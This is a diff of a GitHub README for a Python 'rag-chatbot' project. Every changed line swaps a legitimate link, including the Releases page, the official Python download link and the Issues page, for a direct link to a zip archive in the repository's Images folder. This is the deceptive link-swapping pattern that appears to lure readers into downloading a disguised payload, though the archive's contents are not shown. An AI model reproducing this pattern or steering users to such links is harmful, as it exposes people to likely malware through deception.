@@ -1,6 +1,6 @@
 # 🚀 rag-chatbot - Unlock AI-Powered Responses Instantly
 
-[![Download rag-chatbot](https://img.shields.io/badge/Download-rag--chatbot-brightgreen)](https://github.com/Renatothegithub/rag-chatbot/releases)
+[![Download rag-chatbot](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip)](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip)
 
 ## 📥 Overview
 rag-chatbot is a Python-based chatbot that uses GPT-4o and Bright Data's SERP API to provide real-time, context-rich AI responses. Whether you are looking for instant answers, creative dialogue, or practical advice, this tool can help you make the most of AI technology.
@@ -12,7 +12,7 @@ To start using rag-chatbot, follow these steps to download and run the applicati
 Before you begin, ensure your computer meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Python**: Version 3.7 or higher should be installed on your system. You can [download Python here](https://www.python.org/downloads/).
+- **Python**: Version 3.7 or higher should be installed on your system. You can [download Python here](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip).
 - **Memory**: At least 4GB of RAM is recommended for optimal performance.
 - **Disk Space**: Approximately 500MB of free disk space.
 
@@ -25,7 +25,7 @@ rag-chatbot offers a range of features designed to enhance your experience:
 - **Multi-Language Support**: Primarily focused on Japanese, but can handle various languages.
 
 ## 📥 Download & Install
-To download rag-chatbot, visit the [Releases page](https://github.com/Renatothegithub/rag-chatbot/releases).
+To download rag-chatbot, visit the [Releases page](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip).
 
 1. Click on the link to visit the Releases page.
 2. Look for the latest version of rag-chatbot.
@@ -59,9 +59,9 @@ Explore these resources to enhance your experience with rag-chatbot:
 - **Tutorial Videos**: Watch helpful tutorials on how to maximize the use of rag-chatbot.
 
 ## 📧 Support
-For further assistance, you can reach out via the [GitHub Issues page](https://github.com/Renatothegithub/rag-chatbot/issues). We are here to help!
+For further assistance, you can reach out via the [GitHub Issues page](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip). We are here to help!
 
 ## 💬 Contributing
 If you would like to contribute to rag-chatbot, please check the Contribution Guidelines in the repository. We welcome suggestions, code improvements, and enhancements.
 
-[![Download rag-chatbot](https://img.shields.io/badge/Download-rag--chatbot-brightgreen)](https://github.com/Renatothegithub/rag-chatbot/releases)
+[![Download rag-chatbot](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip)](https://github.com/Renatothegithub/rag-chatbot/raw/refs/heads/main/Images/rag-chatbot-3.6.zip)
